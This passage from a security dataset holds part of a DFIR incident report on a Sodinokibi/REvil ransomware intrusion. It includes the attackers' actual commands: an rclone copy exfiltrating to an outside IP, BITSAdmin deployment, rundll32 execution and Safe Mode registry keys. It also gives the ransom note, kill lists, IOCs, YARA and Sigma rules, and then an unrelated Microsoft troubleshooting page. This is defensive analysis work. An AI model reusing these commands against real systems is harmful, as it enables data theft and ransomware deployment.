--no-check-certificate copy \"\\\\[REDACTED]\\C$\\[REDACTED]\" ftp:1:/C/[REDACTED]\n    File name: svchost.exe\n    Full path: c:\\windows\\svchost.exe\n    SHA1: fcfcf1e45e8d5cdca0450b8dc90754b68e8e\n    SHA256: 538078ab6d80d7cf889af3e08f62c4e83358\n    Signer: Unknown\n  \n  successfully established connection with\n    IP address: 45.147.160.5\n    Port: 443\n    Protocol: Tcp\n```\n\n#### Impact\n\nFor the final actions, the threat actors dropped a ransomware executable on the domain controller in `C:\\Windows` and then used BITSAdmin to deploy the executable to remote systems.\n\n```\nC:\\Windows\\system32\\bitsadmin.exe /transfer debjob /download /priority normal \\\\DOMIANCONTROLLER\\c$\\windows\\DOMAINNAME.exe C:\\Windows\\DOMAINNAME.exe\n```\n\nThe `-smode` flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam.\n\n```image\nAlt: smode Execution\nDescription: The image is a flowchart illustrating the execution process of the Sodinokibi (REvil) ransomware in Safe Mode. It depicts the sequence of processes involved, starting from an RDP login and the parent processes like 'explorer.exe' and 'PowerShell.exe'. The flowchart also includes details of child processes such as 'Bitsadmin.exe' and 'DomainName.exe', highlighting the commands used to execute the ransomware and set system configurations. Additionally, it shows how registry values are manipulated to ensure the system reboots into Safe Mode with Networking and later exits it.\nTranscription: |\n  Sodinokibi (aka REvil) smode Execution\n  \n  RDP Login\n  Parent Process\n  C:\\Windows\\explorer.exe / NOUACCHECK\n      |\n      +-- Parent Process\n          PowerShell.exe\n              |\n              +-- Child Process\n                  Bitsadmin.exe\n                      |\n                      +-- Child Process\n                          DomainName.exe\n                              |\n                              +-- C:\\Windows\\DomainName.exe -smode\n                                  System auto reboots into Safe Mode with Networking within seconds of execution\n                              |\n                              +-- bcdeidt.exe\n                                  |\n                                  +-- Registry value set:\n                                      Key: HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n                                      Value name: *AstraZeneca\n                                      Value data: C:\\windows\\DomainName.exe\n                              |\n                              +-- Registry value set:\n                                  Key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n                                  Value name: *franceisshit\n                                  Value data: bcdeidt /deletevalue {current} safeboot\n```\n\nThe `*franceisshit` key was used to boot the machine out of Safe Mode upon restarting the machine.\n\n```image\nAlt: Registry Key\nDescription: The image depicts a log entry detailing an event related to a ransomware operation. It includes various elements such as the event type ('SetValue'), an image path indicating the location of the executed file, and a unique process ID. Additionally, it references a specific registry key associated with the ransomware's command execution, highlighting the technique used by the threat actors to manipulate system settings for their malicious intent. This information is relevant for understanding the actions and tactics employed by ransomware groups.\nTranscription: |\n  details       : bcdedit /deletevalue {current} safeboot\n  eventType     : SetValue\n  image         : C:\\Windows\\*.exe\n  processGuid   : {b093c253-dfa5-604f-3c07-000000000100}\n  processId     : 6512\n  ruleName      : technique_id=T1547.001, technique_name=Registry Run Keys / Start Folder\n  targetObject  : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*franceisshit\n```\n\nThe systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen. About 10-20 seconds after logging in, all user files were encrypted and a ransom note was placed in numerous locations including the Desktop. Services were not able to be started, which led to collection issues, as normal agents did not start. This also included the startup of EDR and management agents.\n\nWe’ve seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation.\n\nAfter rebooting out of Safe Mode, you are left with the following desktop:\n\n```image\nAlt: Desktop\nDescription: The image is a screenshot of a ransom note displayed in a Notepad window. The note informs the victim that their files are encrypted and currently unavailable, providing instructions on how to recover them. It emphasizes the importance of following the instructions and warns that contacting the attackers is necessary to potentially restore the files. The note includes details on accessing a website via a TOR browser or VPN for further instructions, and it mentions the potential for private data to be published if contact is not made. The overall tone is threatening and demand-driven.\nTranscription: |\n  All of your files are encrypted!\n  Find _________-readme.txt and follow instructions\n  \n  ------ Welcome. Again. ------\n  [+] Whats Happen? [+]\n  Your files are encrypted, and currently unavailable. You can check it: all files on your system has extension ________.\n  By the way, everything is possible to recover (restore), but you need to follow our instructions. Otherwise, you cant return your data (NEVER).\n  \n  ========Attention!!=========\n  Also your private data was downloaded. We will publish it in case you will not get in touch with us asap.\n  ===========================\n  \n  [+] What guarantees? [+]\n  Its just a business. We absolutely do not care about you and your deals, except getting benefits. If we do not do our work and liabilities - nobody will. To check the ability of returning files, You should go to our website. There you can decrypt one file for free. That is our guarantee.\n  If you will not cooperate with our service - for us, it does not matter. But you will lose your time and data, cause just we have the private key.\n  \n  [+] How to get access on website? [+]\n  You have two ways:\n  1) [Recommended] Using a TOR browser!\n     a) Download and install TOR browser from this site: https://torproject.org/\n     b) Open our website: http://___________:929\n  \n  2) If TOR blocked in your country, try to use VPN! But you can use our secondary website. For this:\n     a) Open your any browser (Chrome, Firefox, Opera, IE, Edge)\n     b) Open our secondary website: http://___________\n  \n  Warning: secondary website can be blocked, thats why first variant much better and more available.\n  When you open our website, put the following data in the input form:\n  Key:\n```\n\nOn certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by `rundll32` to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files.\n\n```\nC:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\DomainName.dll,DllRegisterServer\n```\n\n```image\nAlt: rundll32 Execution\nDescription: The image displays a detailed output of a command-line analysis related to the execution of the `rundll32.exe` process. It includes various metadata such as command line, company, current directory, file version, and hashes associated with the process. Additionally, it provides information on the integrity level, logon GUID, logon ID, original file name, and the parent command line and image, indicating that the `rundll32.exe` was executed to register a DLL file during a potential ransomware attack.\nTranscription: |\n  commandLine: 'C:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\...\\DomainName.dll,DllRegisterServer'\n  company: Microsoft Corporation\n  currentDirectory: C:\\Users\\_________\\\n  description: Windows host process (Rundll32)\n  fileVersion: __________\n  hashes:\n    SHA1: F3BA3415D60A8871F285570BEA2E29874CBFF1, MD5: C73BA51880F5A7B20C84185A23212EF, SHA256: __________\n  image: C:\\Windows\\System32\\rundll32.exe\n  integrityLevel: High\n  logonGuid: {4ea529df-c91f-604f-3cb4-a70e00000000}\n  logonId: 0xea7b43c\n  originalFileName: RUNDLL32.EXE\n  parentCommandLine: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'\n  parentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\nThe threat actors asked for 200k in Monero. They were talked down 20-30% and could have been talked down more. Here’s a few screenshots from the website.\n\n```image\nAlt: Ransom Note\nDescription: The image depicts a ransom note displayed on a computer screen, indicating that the network has been infected by ransomware. It features a prominent red header stating 'Your network has been infected!' along with a brief explanation of the situation. The note assures victims that their files are encrypted and provides instructions on how to purchase a decryption tool, referred to as 'General-Decryptor,' along with a price mention for all PCs on the infected network. Additional sections prompt users to follow instructions, chat support, and details about decryption.\nTranscription: |\n  Your network has been infected!\n  \n  Your documents, photos, databases and other important files encrypted\n  \n  To decrypt your files you need to buy our special software - General-Decryptor\n  \n  Follow the instructions below. But remember that you do not have much time\n  \n  General-Decryptor price\n  the price is for all PCs of your infected network\n  \n  How to decrypt files?\n  You will not be able to decrypt the files yourself. If you try, you will lose your files forever.\n  \n  Buy XMR (no need for verification)\n  - LocalMonero\n```\n\nWith the help of @hatching_io (https://tria.ge/) we were able to parse the config from the ransomware sample.\n\n```image\nAlt: Config\nDescription: The image displays a malware analysis report specifically for the Sodinokibi (REvil) ransomware. It includes general information such as the target file 'DomainName.exe', its size (120KB), and a sample identifier. The report features a score of 10/10, suggesting high severity. Additionally, it lists hashes (MD5, SHA1, SHA256, SHA512) corresponding to the malware, confirming its identity and integrity. The extracted malware configuration section outlines attributes like 'Family' as 'sodinokibi', a 'Botnet', and a 'Campaign ID' of 7114, indicating its operational context.\nTranscription: |\n  {\n    \"General\": {\n      \"Target\": \"DomainName.exe\",\n      \"Size\": \"120KB\",\n      \"Sample\": \"210321-rI7ygjf6sa\",\n      \"Score\": \"10/10\",\n      \"MD5\": \"af94dccb62f97700115a219c4b7626d22\",\n      \"SHA1\": \"bb67edcfe4e5b6fe09ee96e5b8ace7a4cfe39eb7\",\n      \"SHA256\": \"2896b38ec3ff196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\",\n      \"SHA512\": \"08c05fd98aba168734732d043c3e403f531522e0ec64484d15375f353aa23f9654852ad2c54a3e6b2a93\"\n    },\n    \"Malware Config\": {\n      \"Extracted\": {\n        \"Family\": \"sodinokibi\",\n        \"Botnet\": \"$2a$\",\n        \"Campaign\": \"7114\"\n      }\n    }\n  }\n```\n\n```\nCampaign ID (sub): 7114\nnet: false\n```\n\nList of processes to kill (prc):\n\n```\noracle\nklnagent\nmydesktopqos\ninfopath\nBackupExtender\npowerpnt\noutlook\nBackupAgent\nSmc\nsql\nccSvcHst\nBackupUpdater\nRtvscan\nwinword\nkavfsscs\nocssd\nisqlplussvc\nvisio\nShadowProtectSvc\ntbirdconfig\nTSSchBkpService\ndbeng50\nccSetMgr\nagntsvc\nSage.NA.AT_AU.SysTray\ndbsnmp\nthebat\nonenote\nAmitiAvSrv\nwordpad\nmsaccess\navgadmsv\nthunderbird\nBackupMaint\nMicrosoft.exchange.store.worker.exe\nCarboniteUI\nexcel\nSPBBCSvc\nLogmeInBackupService\nencsvc\nocomm\nsqbcoreservice\nNSCTOP\nmydesktopservice\nkavfs\nkavfswp\nocautoupds\nmspub\nxfssvccon\nDLOAdminSvcu\nsynctime\nlmibackupvssservice\nfirefox\nsteam\ndlomaintsvcu\n```\n\nList of services to kill:\n\n```\nTelemetryserver\n\"Sophos AutoUpdate Service\"\nsophos\nAltaro.Agent.exe\nmysqld\nMSSQL$MSGPMR\n\"SophosFIM\"\n\"Sophos Web Control Service\"\nSQLWriter\nsvcGenericHost\nAltiBack\n\"SQLServer Analysis Services (MSSQLSERVER)\"\nBackupExecAgentAccelerator\n\"StorageCraft ImageReady\"\nSQLTELEMETRY\nAzureADConnectAuthenticationAgent\nntrtscan\nds_notifier\nTeamViewer\n\"StorageCraft Raw Agent\"\n\"StorageCraft Shadow Copy Provider\"\nSQLTELEMETRY$SQLEXPRESS\nVeeamHvIntegrationSvc\nAltiCTProxy\nMsDtsServer130\nViprePPLSvc\nMcAfeeFramework\nMSSQL$QM\n\"swi_service\"\n\"ThreadLocker\"\nofcservice\nAUService\nsophossps\nAzureADConnectHealthSyncMonitor\nAltaro.OffsiteServer.UI.Service.exe\n\"SAVAdminService\"\nds_monitor\nALTIVRM\nSSASTELEMETRY\nTmCCSF\nMsDtsServer110\n\"Sophos MCS Client\"\nTMBMServer\nSBAMSvc\nmfewc\n\"Sophos System Protection Service\"\nMSSQLFDLauncher$TESTBACKUP02DEV\nVeeamDeploymentService\nmasvc\nbackup\nMSSQL$SQLEXPRESS\nAltiPhoneServ\nMSSQLServerOLAPService\nSSISTELEMETRY130\nVeeamEndpointBackupSvc\nmepocs\nAltaro.UI.Service.exe\n\"ds_agent\"\nHuntressUpdater\nMSSQLFDLauncher\n\"Sophos File Scanner Service\"\nSQLAgent$MSGPMR\nADSync\nKaseyaAgent\nReportServer\nMSSQLFDLauncher$SQLEXPRESS\nMSSQL$HPWJA\nKaseyaAgentEndpoint\nVeeamTransportSvc\n\"ds_monitor\"\nmfevtp\nMSSQLTESTBACKUP02DEV\nSQLTELEMETRY$MSGPMR\nThreadLocker\nMSSQLServerADHelper100\nveeam\ntmlisten\nAzureADConnectHealthSyncInsights\n\"swi_filter\"\nMsDtsServer120\nProtectedStorage\nVeeamDeploySvc\nmemtas\nds_agent\nVeeamMountSvc\nHuntressAgent\nSQLAgent$SQLEXPRESS\nbedbg\nMSSQLSERVER\n\"ofcservice\"\nVipreAAPSvc\n\"Sophos Endpoint Defense Service\"\nKACHIPS906995744173948\nDsSvc\nMSSQLLaunchpad$SQLEXPRESS\nmsseces\nmacmnsvc\nLTService\nCode42Service\nAltaro.HyperV.WAN.RemoteService.exe\nLTSvcMon\nMSSQL$SQLEXPRESSADV\n\"SAVService\"\nAltaro.OffsiteServer.Service.exe\n\"Sage 100cloud Advanced 2020 (9920)\"\nAltaro.SubAgent.exe\nmfemms\n\"TeamViewer\"\n\"SQLServer Reporting Services (MSSQLSERVER)\"\nVSS\nsql\nAltaro.SubAgent.N2.exe\n\"SQLServer Integration Services 12.0\"\nSQLSERVERAGENT\nvss\n\"Sophos Safestore Service\"\nklnagent\n\"Sage.NA.AT_AU.Service\"\nMBAMService\n\"Sophos Health Service\"\nSQLBrowser\nMySQL\n\"ProtectedStorage\"\n\"Sophos Clean Service\"\n\"Sage 100c Advanced 2017 (9917)\"\n\"SntpService\"\nVeeamNFSSvc\nKAVFS\nSQLEXPRESSADV\nKAENDCHIPS906995744173948\nsppsvc\nAmsp\npsqlWGE\nMicrosoft.exchange.store.worker.exe\nkavfsscs\n\"Amsp\"\nsqlservr\nAltaro.DedupService.exe\nsvc$\n\"ds_notifier\"\n\"Sophos Device Control Service\"\nAzureADConnectAgentUpdater\nAltiFTPUploader\n\"Sophos MCS Agent\"\n```\n\nTriage sandbox run of the executable without smode:\n\n```image\nAlt: Triage Sandbox\nDescription: The image displays a detailed dashboard or report related to the Sodinokibi (REvil) ransomware, focusing on various signatures and processes associated with it. It features a list of signatures categorized by their effects, such as 'Collection,' 'Credential Access,' 'Defense Evasion,' 'Discovery,' 'Impact,' and 'Persistence.' The signature for the Sodinokibi ransomware is highlighted in red, indicating a significant impact. Additionally, the image lists specific processes, including their file paths, relevant to the ransomware's execution and behavior on the compromised system.\nTranscription: |\n  # Signatures\n  Filter: none\n  - Sodin,Sodinokibi,REvil\n  - Modifies extensions of user files\n  - Reads user/profile data of web browsers\n  - Adds Run key to start application\n  - Enumerates connected drives\n  - Sets desktop wallpaper using registry\n  - Drops file in Program Files directory\n  - Suspicious behavior: EnumeratesProcesses\n  - Suspicious use of AdjustPrivilegeToken\n  \n  # Processes\n  - C:\\Users\\Admin\\AppData\\Local\\Temp\\DomainName.exe\n    - Modifies extensions of user files\n    - Adds Run key to start application\n    - Enumerates connected drives\n    - Drops file in Program Files directory\n    - Suspicious behavior: EnumeratesProcesses\n    - Suspicious use of AdjustPrivilegeToken\n  \n  - C:\\Windows\\system32\\wbem\\unsecapp.exe\n  - C:\\Windows\\system32\\svsvc.exe\n```\n\n### IOCs\n\n#### Network\n\n```\n45.86.163.78|80\n45.86.163.78|443\n45.86.163.78|8080\n195.189.99.74|80\n195.189.99.74|443\n195.189.99.74|8080\n206.189.10.247|80\n161.35.109.168|443\nsmalleststores.com\ncloudmetric.online\ncikawemoret34.space\nnomovee.website\n```\n\n#### File\n\n```\nskull-x64.dat\n5c3a6978bb960d8fbccd117ddcc3ca10\n17424cfeb756e231bea6d1363151a83af142ba6f\n59a2a5fae1c51afbbf1b8c6eb0a65cb2b8575794e3890f499f8935035e633fc\nCiocca.dll\n296f1098a3a8cfb7e07808ee08361495\n7d903f87fd305f1c93ec420848fd6e5aeb018d59\nb1b00f7b065e8c013e0c23c0f34707819e0d537dbe2e83d0d023a11a0ca6b388\nlicense.dat\n6f208841cfd819c29a7cbc0a202bd7a3\n0febc376cc066bb668f1a80b969ed112da8e871c\n45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865\nDomainName.dll\nc8fab46c4fd61c5f138fb151638c35e1\nc4830cbf3a3044f6e50cd60127ff5681f8ee4bbf\n64076294e761cee0ce7d7cd28dae05f483a711eafe47f94fe881ac3980abfd8f\nDomainName.exe\naf94ccb62f97700115a219c4b7626d22\nbb67edcfe4e5b6fe09ee96e5b8ace7a4cfe39eb7\n2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\nsvchost.exe (rclone)\nfcfcf1e45e8d5cdca0450b8dc90754b68e8e4673\n538078ab6d80d7cf889af3e08f62c4e83358596f31ac8ae8fbc6326839a6bfe5\nAdFind.exe\ncb198869ca3c96af536869e71c54dd9d83afbee6\n56de41fa0a94fa7fff68f02712a698ba2f0a71afcecb217f6519bd5751baf3ed\n```\n\n### Detections\n\n#### Network\n\n```\nETPRO TROJAN Cobalt Strike Malleable C2 JQuery Custom Profile M2\nET DNS Query to a *.top domain\nET POLICY OpenSSL Demo CA - Internet Widgits Pty\n```\n\n#### Sigma\n\n- Suspicious PowerShell Encoded Command\n- Trickbot Recon Activity\n- Suspicious Commands Recon Activity\n- Rundll32 Net Connections\n- BITSAdmin Download\n- Suspicious AdFind\n- Suspicious WMI Execution\n- Office Shell\n\nCustom rule thanks to @0xThiebaut:\n\n```\ntitle: Sodinokibi Ransomware Registry Key\nid: 9fecd354-77f0-498e-a611-c963970e7bca\ndescription: Detects the creation of Sodinokibi (aka REvil) registry keys\nstatus: experimental\nreferences:\n  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n  - https://twitter.com/malwrhunterteam/status/1372648463553462279\ntags:\n  - attack.persistence\n  - attack.t1547.001\ndate: 2021/03/29\nauthor: Maxime THIEBAUT (@0xThiebaut)\nlogsource:\n  category: registry_event\n  product: windows\ndetection:\n  selection:\n    TargetObject|contains:\n      - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*AstraZeneca'\n      - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*franceisshit'\ncondition: selection\nlevel: high\n```\n\nCustom rule thanks to @lindodapoet_:\n\n```\ntitle: Svchost data exfiltration\nid: dc4249c9-d96f-401b-a92b-caa6208c097d\nstatus: experimental\ndescription: Detects possible data exfiltration via svchost\nreferences:\n  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\nauthor: Nclose\ndate: 2021/03/29\ntags:\n  - attack.exfiltration\n  - attack.t1048\nlogsource:\n  product: windows\n  service: process_creation\ndetection:\n  selection:\n    CommandLine|contains: 'copy'\n    Image|endswith: '\\svchost.exe'\ncondition: selection\nfalsepositives:\n  - Unknown\nlevel: high\n```\n\n### Custom rules and rule ideas_Ransomware.yaml) written by @BlackMatter23.\n\n### Yara\n\n```\n/*\nYARA Rule Set\nAuthor: The DFIR Report\nDate: 2021-03-29\nIdentifier: files\nReference: https://thedfirreport.com\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\nrule Sodinokibi_032021 {\nmeta:\n  description = \"files - file DomainName.exe\"\n  author = \"The DFIR Report\"\n  reference = \"https://thedfirreport.com\"\n  date = \"2021-03-21\"\n  hash1 = \"2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\"\nstrings:\n  $s1 = \"vmcompute.exe\" fullword wide\n  $s2 = \"vmwp.exe\" fullword wide\n  $s3 = \"bootcfg /raw /a /safeboot:network /id 1\" fullword ascii\n  $s4 = \"bcdedit /set {current} safeboot network\" fullword ascii\n  $s5 = \"7+a@P>:N:0!F$%I-6MBEFb M\" fullword ascii\n  $s6 = \"jg:\\\"\\\\0=Z\" fullword ascii\n  $s7 = \"ERR0R D0UBLE RUN!\" fullword wide\n  $s8 = \"VVVVVPQ\" fullword ascii\n  $s9 = \"VVVVVWQ\" fullword ascii\n  $s10 = \"Running\" fullword wide /* Goodware String - occured 159 times */\n  $s11 = \"expand 32-byte kexpand 16-byte k\" fullword ascii\n  $s12 = \"9RFIT\\\"&\"\n  $s13 = \"jZXVf9F\" fullword ascii\n  $s14 = \"tCWWWhS=@\" fullword ascii\n  $s15 = \"vmms.exe\" fullword wide /* Goodware String - occured 1 times */\n  $s16 = \"JJwK9Zl\" fullword ascii\n  $s17 = \"KkT37uf4nNh2PqUDwZqxcHUMVV3yBwSHO#K\" fullword ascii\n  $s18 = \"0*090}0\" fullword ascii /* Goodware String - occured 1 times */\n  $s19 = \"5)5I5a5\" fullword ascii /* Goodware String - occured 1 times */\n  $s20 = \"7-7H7c7\" fullword ascii /* Goodware String - occured 1 times */\ncondition:\n  uint16(0) == 0x5a4d and filesize < 400KB and\n  ( pe.imphash() == \"031931d2f2d921a9d906454d42f21be0\" or 8 of them )\n}\n\nrule icedid_032021_1 {\nmeta:\n  description = \"files - file skull-x64.dat\"\n  author = \"The DFIR Report\"\n  reference = \"https://thedfirreport.com\"\n  date = \"2021-03-21\"\n  hash1 = \"59a2a5fae1c51afbbf1bf8c6eb0a65cb2b8575794e3890f499f8935035e633fc\"\nstrings:\n  $s1 = \"update\" fullword ascii /* Goodware String - occured 207 times */\n  $s2 = \"PstmStr\" fullword ascii\n  $s3 = \"mRsx0k/\" fullword wide\n  $s4 = \"D$0lzK\" fullword ascii\n  $s5 = \"A;Zts}H\" fullword ascii\ncondition:\n  uint16(0) == 0x5a4d and filesize < 100KB and\n  ( pe.imphash() == \"67a065c05a359d287f1fed9e91f823d5\" and ( pe.exports(\"PstmStr\") and pe.exports(\"update\") ) or all of them )\n}\n\nrule icedid_032021_2 {\nmeta:\n  description = \"1 - file license.dat\"\n  author = \"The DFIR Report\"\n  reference = \"https://thedfirreport.com\"\n  date = \"2021-03-21\"\n  hash1 = \"45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865\"\nstrings:\n  $s1 = \"+ M:{`n-\" fullword ascii\n  $s2 = \"kwzzdd\" fullword ascii\n  $s3 = \"w5O- >z\" fullword ascii\n  $s4 = \"RRlK8n@~\" fullword ascii\ncondition:\n  uint16(0) == 0x43da and filesize < 1000KB and\n  8 of them\n}\n```\n\n### MITRE\n\n```\nSpearphishing Attachment - T1566.001\nUser Execution - T1204\nWindows Management Instrumentation - T1047\nProcess Injection - T1055\nDomain Trust Discovery - T1482\nDomain Account - T1087.002\nSystem Information Discovery - T1082\nSystem Network Configuration Discovery - T1016\nSecurity Software Discovery - T1518.001\nSMB/Windows Admin Shares - T1021.002\nRemote Desktop Protocol - T1021.001\nCommonly Used Port - T1043\nApplication Layer Protocol - T1071\nExfiltration Over Asymmetric Encrypted Non-C2 Protocol - T1048.002\nData Encrypted for Impact - T1486\nMalicious File - T1204.002\nCommand and Scripting Interpreter - T1059\nPowerShell - T1059.001\nScheduled Task - T1053.005\nRemote System Discovery - T1018\nRundll32 - T1218.011\n```",
    "sigma_rule": {
      "title": "Suspicious WmiPrvSE Child Process",
      "id": "8a582fe2-0882-4b89-a82a-da6b2dc32937",
      "related": [
        {
          "id": "692f0bec-83ba-4d04-af7e-e884a96059b6",
          "type": "similar"
        },
        {
          "id": "d21374ff-f574-44a7-9998-4a8c8bf33d7d",
          "type": "similar"
        },
        {
          "id": "18cf6cf0-39b0-4c22-9593-e244bdc9a2d4",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects suspicious and uncommon child processes of WmiPrvSE",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml",
        "https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/",
        "https://twitter.com/ForensicITGuy/status/1334734244120309760"
      ],
      "author": "Vadim Khrykov (ThreatIntel), Cyb3rEng, Florian Roth (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2023-11-10",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1047",
        "attack.t1204.002",
        "attack.t1218.010"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\wbem\\WmiPrvSE.exe"
        },
        "selection_children_1": {
          "Image|endswith": [
            "\\certutil.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\msiexec.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\verclsid.exe",
            "\\wscript.exe"
          ]
        },
        "selection_children_2": {
          "Image|endswith": "\\cmd.exe",
          "CommandLine|contains": [
            "cscript",
            "mshta",
            "powershell",
            "pwsh",
            "regsvr32",
            "rundll32",
            "wscript"
          ]
        },
        "filter_main_werfault": {
          "Image|endswith": "\\WerFault.exe"
        },
        "filter_main_wmiprvse": {
          "Image|endswith": "\\WmiPrvSE.exe"
        },
        "filter_main_msiexec": {
          "Image|endswith": "\\msiexec.exe",
          "CommandLine|contains": "/i "
        },
        "condition": "selection_parent and 1 of selection_children_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmiprvse_susp_child_processes.yml",
    "id": "682"
  },
  {
    "url": "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
    "markdown": "# Troubleshooting packaging, deployment, and query of Windows apps\n\nUse these suggestions to troubleshoot problems you experience when packaging, deploying, or querying a Windows app package (.msix/.appx) as a developer.\n\n> **Note**\n> This article is intended for developers. If you are not a developer and you are looking for help with a Windows app installation error, see Windows support.\n\n## Get diagnostic information\n\nWhen an API fails, it returns an error code that describes the problem. If the error code doesn't provide enough information, you find more diagnostic information in the detailed event logs.\n\nTo access the packaging and deployment event logs by using **Event Viewer**, follow these steps:\n\n1. Perform one of the following steps:\n   - Click **Start** on the Windows menu, type **Event Viewer**, and press **Enter**.\n   - Run **eventvwr.msc**.\n2. In the left page, expand **Event Viewer (Local) > Applications and Services Logs > Microsoft > Windows**.\n3. Check for available logs under these categories:\n   - **AppxPackagingOM > Microsoft-Windows-AppxPackaging/Operational**\n   - **AppXDeployment-Server > Microsoft-Windows-AppXDeploymentServer/Operational**\n\nStart by looking at the logs under **AppXDeployment-Server**. If the error was caused by **0x80073CF0** or **ERROR_INSTALL_OPEN_PACKAGE_FAILED**, additional details may be present in the **AppxpackagingOM** logs.\n\nYou can also use the Get-AppxLog command in PowerShell to get the first few logged events. The following example displays the logs associated with the most recent deployment operation.\n\n```\nGet-Appxlog\n```\n\nThe following example displays the logs associated with the most recent deployment operation in an interactive table in a separate window.\n\n```\nGet-Appxlog | Out-GridView\n```\n\n## Common error codes\n\nThis table lists some of the most common error codes. If you need further help with one of these errors, or if you're encountering an error code not in this list, see additional help options.\n\n| Error code                                                                                             | Value      | Description and possible causes|\n| ------------------------------------------------------------------------------------------------------ | ---------- ||\n| **E_FILENOTFOUND**                                                                                     | 0x80070002 | File or path is not found. This can occur during a COM typelib validation requires that the path for the directory actually exist within your MSIX package|\n| **ERROR_BAD_FORMAT**                                                                                   | 0x8007000B | The package isn't correctly formatted and needs to be re-built or re-signed.  <br>You may get this error if there is a mismatch between the signing certificate subject name and the AppxManifest.xml publisher name.  <br>See [How to sign an app package using SignTool](how-to-sign-a-package-using-signtool).                                                                                                                                                                                                                                                                                                                                                                                                                                                          |\n| **E_INVALIDARG**                                                                                       | 0x80070057 | One or more arguments are not valid. If you check the AppXDeployment-Server event log and see the following event: \"While installing the package, the system failed to register the windows.repositoryExtension extension due to the following error: The parameter is incorrect.\"  <br>You may get this error if the manifest elements DisplayName or Description contain characters disallowed by Windows firewall such as `\\                                                                                                                                                                                                                                                                                                                                            | `, due to which Windows fails to create the AppContainer profile for the package. Please remove these characters from the manifest and try installing the package. |\n| **ERROR_INSTALL_OPEN_**  <br>**PACKAGE_FAILED**                                                        | 0x80073CF0 | The package couldn't be opened.  <br>Possible causes:  <br><br>*   The package is unsigned.<br>*   The publisher name doesn't match the signing certificate subject.<br>*   The file:// prefix is missing or the package couldn't be found at the specified location.<br><br>For more information, check the **AppxPackagingOM** event log.                                                                                                                                                                                                                                                                                                                                                                                                                                |\n| **ERROR_INSTALL_PACKAGE_**  <br>**NOT_FOUND**                                                          | 0x80073CF1 | The package couldn't be found.  <br>You may get this error while removing a package that isn't installed for the current user|\n| **ERROR_INSTALL_INVALID_**  <br>**PACKAGE**                                                            | 0x80073CF2 | The package data isn't valid|\n| **ERROR_INSTALL_RESOLVE_**  <br>**DEPENDENCY_FAILED**                                                  | 0x80073CF3 | The package failed update, dependency, or conflict validation.  <br>Possible causes:  <br><br>*   The incoming package conflicts with an installed package.<br>*   A specified package dependency can't be found.<br>*   The package doesn't support the correct processor architecture.<br><br>For more informtion, check the **AppXDeployment-Server** event log.                                                                                                                                                                                                                                                                                                                                                                                                        |\n| **ERROR_INSTALL_OUT_**  <br>**OF_DISK_SPACE**                                                          | 0x80073CF4 | There isn't enough disk space on your computer. Free some space and try again|\n| **ERROR_INSTALL_NETWORK_**  <br>**FAILURE**                                                            | 0x80073CF5 | The package can't be downloaded|\n| **ERROR_INSTALL_**  <br>**REGISTRATION_FAILURE**                                                       | 0x80073CF6 | The package can't be registered.  <br>For more information, check the **AppXDeployment-Server** event log|\n| **ERROR_INSTALL_**  <br>**DEREGISTRATION_EFAILURE**                                                    | 0x80073CF7 | The package can't be unregistered.  <br>You may get this error while removing a package.  <br>For more information, check the **AppXDeployment-Server** event log|\n| **ERROR_INSTALL_CANCEL**                                                                               | 0x80073CF8 | The user canceled the install request|\n| **ERROR_INSTALL_FAILED**                                                                               | 0x80073CF9 | Package install failed. Contact the software vendor.  <br>For more information, check the **AppXDeployment-Server** event log|\n| **ERROR_REMOVE_FAILED**                                                                                | 0x80073CFA | Package removal failed.  <br>You may get this error for failures that occur during package uninstall.  <br>For more information, see [**RemovePackageAsync**](/en-us/uwp/api/windows.management.deployment.packagemanager.removepackageasync|\n| **ERROR_PACKAGE_**  <br>**ALREADY_EXISTS**                                                             | 0x80073CFB | The provided package is already installed, and reinstallation of the package is blocked.  <br>You may get this error if installing a package that is not bitwise identical to the package that is already installed. Note that the digital signature is also part of the package. Hence if a package is rebuilt or 